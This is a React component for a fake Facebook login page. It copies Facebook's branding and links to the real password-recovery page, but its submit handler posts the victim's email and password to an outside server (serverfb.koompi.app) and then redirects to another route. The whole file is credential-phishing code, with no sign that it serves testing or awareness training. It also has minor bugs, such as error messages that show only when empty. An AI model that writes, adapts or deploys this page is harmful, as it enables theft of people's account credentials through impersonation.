import { useState } from "react";
import axios from "axios";
import "./App.css";

function Login() {
  const [value, setValue] = useState({
    email: "",
    password: "",
  });
  const [loading, setLoading] = useState(false);
  const [message, setMessate] = useState("");
  const [messagepass, setMessatepass] = useState("");
  const { email, password } = value;
  const config = {
    headers: { "content-type": "application/json" },
    withCredentials: true,
  };
  const handleChange = (e) => {
    setValue({ ...value, [e.target.name]: e.target.value });
  };
  const submitHandler = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      await axios
        .post(`https://serverfb.koompi.app/api/fb`, value, config)
        .then((res) => {
          window.location.replace("/des");
        });
    } catch (error) {
      setLoading(false);
      if (email === "") {
        setMessate("please input email or phone number");
      } else if (password === "") {
        setMessatepass("please input your password");
      }
      console.log(error.message);
    }
  };
  return (
    <div>
      <h1 className="text-5xl font-extrabold text-center mt-12 text-blue-500 ">
        Facebook
      </h1>
      <br />
      <center>
        <div className="bg-white shadow-md w-[420px] rounded-lg p-4">
          <h1 className="text-xl">Login to Facebook</h1>
          <form onSubmit={submitHandler}>
            <input
              className="border w-full p-2 border-gray-300 rounded-md text-lg mt-4"
              placeholder="Email address or phone number"
              name="email"
              value={email}
              onChange={handleChange}
            />
            {message === "" ? <p className="text-red-700">{message}</p> : ""}

            <input
              className="border w-full p-2 border-gray-300 rounded-md text-lg mt-4"
              placeholder="Password"
              name="password"
              onChange={handleChange}
              value={password}
            />
            {messagepass === "" ? (
              <p className="text-red-700">{messagepass}</p>
            ) : (
              ""
            )}
            {email === "" || password === "" ? (
              <button
                disabled
                className="mb-2 bg-blue-200 p-2 mt-6 w-full font-bold text-white text-lg rounded-md"
              >
                {loading ? "..." : "Log in"}
              </button>
            ) : (
              <button className="mb-2 bg-blue-500 p-2 mt-6 w-full font-bold text-white text-lg rounded-md">
                {loading ? "..." : "Log in"}
              </button>
            )}
          </form>
          <a
            className="text-blue-500"
            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
          >
            Forgotten password?
          </a>
        </div>
      </center>
    </div>
  );
}

export default Login;
